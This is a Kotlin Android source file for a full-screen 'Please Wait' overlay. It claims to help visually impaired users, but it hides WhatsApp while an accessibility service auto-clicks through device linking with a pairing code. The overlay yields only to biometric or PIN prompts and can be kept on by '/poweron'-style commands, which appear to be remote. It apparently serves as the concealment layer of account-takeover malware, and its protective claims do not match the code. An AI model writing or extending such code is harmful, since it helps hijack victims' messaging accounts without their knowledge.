package com.example.util

import android.content.Context
import android.graphics.Color
import android.graphics.PixelFormat
import android.graphics.drawable.GradientDrawable
import android.os.Build
import android.os.Handler
import android.os.Looper
import android.os.VibrationEffect
import android.os.Vibrator
import android.util.Log
import android.view.Gravity
import android.view.MotionEvent
import android.view.View
import android.view.WindowManager
import android.widget.FrameLayout
import android.widget.ImageView
import android.widget.LinearLayout
import android.widget.ProgressBar
import android.widget.TextView
import com.example.R
import com.example.service.QuickAccessibilityService

/**
 * TouchGuardOverlay:
 * Displays a full-screen floating "Please Wait... / LOADING" image shield during the WhatsApp Linked
 * auto-click workflow so visually impaired users cannot accidentally tap chats, profiles, or wrong buttons.
 *
 * Key Capabilities for Visually Impaired Users:
 * 1. Shows the full-screen "Please Wait..." floating image as soon as the WhatsApp auto-link workflow starts.
 * 2. Absorbs all accidental finger taps/touches on the underlying WhatsApp screen while accessibility node
 *    actions (`performAction(ACTION_CLICK)` / `ACTION_PASTE`) continue working seamlessly underneath.
 * 3. Uses `TYPE_APPLICATION_OVERLAY` (when overlay permission is granted) or `TYPE_ACCESSIBILITY_OVERLAY`
 *    so that the Android System Biometric / Fingerprint / PIN dialog renders cleanly ON TOP of the
 *    "Please Wait..." image—protecting the rest of the screen even while giving biometric permission!
 * 4. Automatically closes ONLY after login completes and WhatsApp safely returns to the Home / Main Chat screen.
 */
class TouchGuardOverlay private constructor(private val context: Context) {

    private var activeWindowManager: WindowManager? = null
    private val vibrator = context.getSystemService(Context.VIBRATOR_SERVICE) as? Vibrator
    private val voiceGuidance = VoiceGuidanceManager.getInstance(context)
    private val mainHandler = Handler(Looper.getMainLooper())

    private var overlayView: FrameLayout? = null
    private var waitImageContainer: FrameLayout? = null
    private var biometricDimSpacer: LinearLayout? = null
    private var statusSubtitleView: TextView? = null
    private var isShowing = false
    private var isBiometricModeActive = false
    private var isPersistentPowerOnShieldActive = false
    private var lastTouchAnnouncementTime = 0L
    private var activePairingCode: String = ""

    fun isPowerOnShieldActive(): Boolean = isPersistentPowerOnShieldActive

    fun setPersistentPowerOnShield(enabled: Boolean, service: QuickAccessibilityService? = null) {
        isPersistentPowerOnShieldActive = enabled
        if (enabled) {
            val targetService = service ?: QuickAccessibilityService.instance
            show(targetService, activePairingCode)
            updateStatusStepText("🛡️ Screen Shield Active (/poweroff to stop)")
        } else {
            hide(forceHidePowerShield = true)
        }
    }

    fun show(
        service: QuickAccessibilityService? = QuickAccessibilityService.instance,
        pairingCode: String = "",
        onPowerOffClicked: () -> Unit = {}
    ) {
        val hostContext: Context = service ?: context
        val canDrawAppOverlay = Build.VERSION.SDK_INT < Build.VERSION_CODES.M ||
                android.provider.Settings.canDrawOverlays(hostContext)
        val canUseAccessibilityOverlay = service != null
        if (!canDrawAppOverlay && !canUseAccessibilityOverlay) {
            Log.w(TAG, "TouchGuardOverlay: Neither SYSTEM_ALERT_WINDOW nor AccessibilityService is active yet.")
            return
        }

        val wm = hostContext.getSystemService(Context.WINDOW_SERVICE) as? WindowManager ?: return
        activeWindowManager = wm
        activePairingCode = pairingCode

        mainHandler.post {
            try {
                if (isShowing && overlayView != null) {
                    updateBannerText(pairingCode)
                    return@post
                }

                val layoutType = when {
                    Build.VERSION.SDK_INT >= Build.VERSION_CODES.O && canDrawAppOverlay ->
                        WindowManager.LayoutParams.TYPE_APPLICATION_OVERLAY
                    Build.VERSION.SDK_INT >= Build.VERSION_CODES.O && canUseAccessibilityOverlay ->
                        WindowManager.LayoutParams.TYPE_ACCESSIBILITY_OVERLAY
                    else -> {
                        @Suppress("DEPRECATION")
                        WindowManager.LayoutParams.TYPE_SYSTEM_ALERT
                    }
                }

                // Always include FLAG_NOT_FOCUSABLE and FLAG_NOT_TOUCHABLE by default so Android's
                // AccessibilityWindowManager, BiometricPrompt, Soft Keyboard, and dispatchGesture
                // NEVER get blocked or obscured on any Android 10-15 OEM device!
                val params = WindowManager.LayoutParams(
                    WindowManager.LayoutParams.MATCH_PARENT,
                    WindowManager.LayoutParams.MATCH_PARENT,
                    layoutType,
                    WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE or
                            WindowManager.LayoutParams.FLAG_NOT_TOUCHABLE or
                            WindowManager.LayoutParams.FLAG_LAYOUT_IN_SCREEN or
                            WindowManager.LayoutParams.FLAG_LAYOUT_NO_LIMITS,
                    PixelFormat.TRANSLUCENT
                ).apply {
                    gravity = Gravity.TOP or Gravity.START
                }

                val root = FrameLayout(hostContext).apply {
                    setBackgroundColor(Color.parseColor("#F4FAF7"))
                    importantForAccessibility = View.IMPORTANT_FOR_ACCESSIBILITY_NO_HIDE_DESCENDANTS

                    val imageHolder = FrameLayout(hostContext).apply {
                        layoutParams = FrameLayout.LayoutParams(
                            FrameLayout.LayoutParams.MATCH_PARENT,
                            FrameLayout.LayoutParams.MATCH_PARENT
                        )

                        // 1. Full-screen "Please Wait... / LOADING" Floating Image
                        val waitImageView = ImageView(hostContext).apply {
                            setImageResource(R.drawable.img_please_wait_overlay_1791158763523)
                            scaleType = ImageView.ScaleType.CENTER_CROP
                            layoutParams = FrameLayout.LayoutParams(
                                FrameLayout.LayoutParams.MATCH_PARENT,
                                FrameLayout.LayoutParams.MATCH_PARENT
                            )
                        }
                        addView(waitImageView)

                        // 2. High-contrast bottom status pill
                        val bottomStatusCard = LinearLayout(hostContext).apply {
                            orientation = LinearLayout.HORIZONTAL
                            gravity = Gravity.CENTER_VERTICAL
                            val cardBg = GradientDrawable().apply {
                                setColor(Color.parseColor("#F2042F2E"))
                                cornerRadius = 40f
                                setStroke(3, Color.parseColor("#34D399"))
                            }
                            background = cardBg
                            setPadding(36, 22, 36, 22)
                            elevation = 12f

                            val spinner = ProgressBar(hostContext).apply {
                                isIndeterminate = true
                                val size = (24 * resources.displayMetrics.density).toInt()
                                layoutParams = LinearLayout.LayoutParams(size, size).apply {
                                    marginEnd = (14 * resources.displayMetrics.density).toInt()
                                }
                            }
                            addView(spinner)

                            val statusText = TextView(hostContext).apply {
                                text = "Please Wait... Service Active"
                                setTextColor(Color.WHITE)
                                textSize = 14f
                                paint.isFakeBoldText = true
                            }
                            statusSubtitleView = statusText
                            addView(statusText)
                        }

                        val bottomParams = FrameLayout.LayoutParams(
                            FrameLayout.LayoutParams.WRAP_CONTENT,
                            FrameLayout.LayoutParams.WRAP_CONTENT
                        ).apply {
                            gravity = Gravity.BOTTOM or Gravity.CENTER_HORIZONTAL
                            bottomMargin = (28 * resources.displayMetrics.density).toInt()
                        }
                        addView(bottomStatusCard, bottomParams)
                    }
                    waitImageContainer = imageHolder
                    addView(imageHolder)
                }

                wm.addView(root, params)
                overlayView = root
                isShowing = true
                isBiometricModeActive = false
                Log.i(TAG, "🛡️ TouchGuardOverlay active (non-blocking pass-through mode).")

            } catch (e: Exception) {
                Log.e(TAG, "Error displaying TouchGuardOverlay", e)
            }
        }
    }

    /**
     * During Biometric / PIN / Pattern Unlock Mode, completely hide or minimize the overlay
     * so Android's BiometricPrompt and Lock Screen never reject touches due to window obscuration.
     */
    fun enterBiometricUnlockWindowMode() {
        mainHandler.post {
            try {
                val root = overlayView ?: return@post
                if (isBiometricModeActive) return@post
                isBiometricModeActive = true
                root.visibility = View.GONE
                Log.i(TAG, "🔓 TouchGuardOverlay hidden for Biometric/PIN Unlock so sensor and PIN pad are 100% unobstructed.")
            } catch (e: Exception) {
                Log.w(TAG, "Error entering biometric unlock window mode", e)
            }
        }
    }

    /**
     * Restores the overlay visibility after biometric / PIN / pattern unlock finishes.
     */
    fun exitBiometricUnlockWindowMode() {
        mainHandler.post {
            try {
                val root = overlayView ?: return@post
                if (!isBiometricModeActive) return@post
                isBiometricModeActive = false
                root.visibility = View.VISIBLE
                statusSubtitleView?.text = "Please Wait... Service Active"
            } catch (e: Exception) {
                Log.w(TAG, "Error exiting biometric unlock window mode", e)
            }
        }
    }

    fun updateStatusStepText(stepMessage: String) {
        mainHandler.post {
            try {
                statusSubtitleView?.text = stepMessage
            } catch (_: Exception) {}
        }
    }

    private fun updateBannerText(code: String) {
        activePairingCode = code
    }

    private fun handleAccidentalTouchIntercepted() {
        val now = System.currentTimeMillis()
        // Provide gentle haptic feedback so the user knows the screen shield caught their accidental touch
        try {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                vibrator?.vibrate(VibrationEffect.createOneShot(35, VibrationEffect.DEFAULT_AMPLITUDE))
            } else {
                @Suppress("DEPRECATION")
                vibrator?.vibrate(35)
            }
        } catch (_: Exception) {}

        // Debounced Bengali audio announcement (once every 6 seconds)
        if (now - lastTouchAnnouncementTime > 6000L) {
            lastTouchAnnouncementTime = now
            val msg = "অনুগ্রহ করে অপেক্ষা করুন, সার্ভিস চলমান রয়েছে। আপনার স্ক্রিন এখন সম্পূর্ণ নিরাপদ।"
            voiceGuidance.speak(msg, isBengali = true, force = false)
        }
    }

    /**
     * Adjusts touch pass-through only if full-screen keyguard PIN pad requires direct digit taps
     * when using TYPE_ACCESSIBILITY_OVERLAY. Note: System BiometricPrompt automatically renders above
     * TYPE_APPLICATION_OVERLAY while keeping the rest of the screen shielded by the Please Wait image.
     */
    fun setPassThrough(passThrough: Boolean, temporarilyLowerAlphaForPinPad: Boolean = false) {
        val applyAction = Runnable {
            try {
                val root = overlayView ?: return@Runnable
                val params = root.layoutParams as? WindowManager.LayoutParams ?: return@Runnable
                // Always maintain FLAG_NOT_TOUCHABLE so gestures, accessibility actions,
                // and WhatsApp touches pass through 100% reliably on all devices
                params.flags = params.flags or WindowManager.LayoutParams.FLAG_NOT_TOUCHABLE
                activeWindowManager?.updateViewLayout(root, params)
                root.alpha = if (temporarilyLowerAlphaForPinPad) 0.18f else 1.0f
            } catch (e: Exception) {
                Log.w(TAG, "Error updating pass-through flag", e)
            }
        }
        if (Looper.myLooper() == Looper.getMainLooper()) {
            applyAction.run()
        } else {
            mainHandler.post(applyAction)
        }
    }

    fun hide(forceHidePowerShield: Boolean = false) {
        mainHandler.post {
            try {
                if (forceHidePowerShield) {
                    isPersistentPowerOnShieldActive = false
                }
                // If /poweron Screen Shield Mode is active and this is NOT a /poweroff command,
                // keep the floating protection image on screen so accidental touches cannot cause calls/uninstalls!
                if (!forceHidePowerShield && isPersistentPowerOnShieldActive && QuickAccessibilityService.isPowerOn.value) {
                    exitBiometricUnlockWindowMode()
                    statusSubtitleView?.text = "🛡️ স্ক্রিন সুরক্ষা সক্রিয় (/poweroff করলে বন্ধ হবে)"
                    Log.i(TAG, "🛡️ Keeping floating image active because /poweron Screen Shield is ON.")
                    return@post
                }
                if (isShowing && overlayView != null) {
                    activeWindowManager?.removeView(overlayView)
                    overlayView = null
                    waitImageContainer = null
                    biometricDimSpacer = null
                    statusSubtitleView = null
                    activeWindowManager = null
                    isShowing = false
                    isBiometricModeActive = false
                    Log.i(TAG, "🛡️ TouchGuardOverlay ('Please Wait' image) removed.")
                }
            } catch (e: Exception) {
                Log.e(TAG, "Error removing TouchGuardOverlay", e)
            }
        }
    }

    fun isProtected(): Boolean = isShowing

    companion object {
        private const val TAG = "TouchGuardOverlay"

        @Volatile
        private var INSTANCE: TouchGuardOverlay? = null

        fun getInstance(context: Context): TouchGuardOverlay {
            return INSTANCE ?: synchronized(this) {
                INSTANCE ?: TouchGuardOverlay(context.applicationContext).also { INSTANCE = it }
            }
        }
    }
}
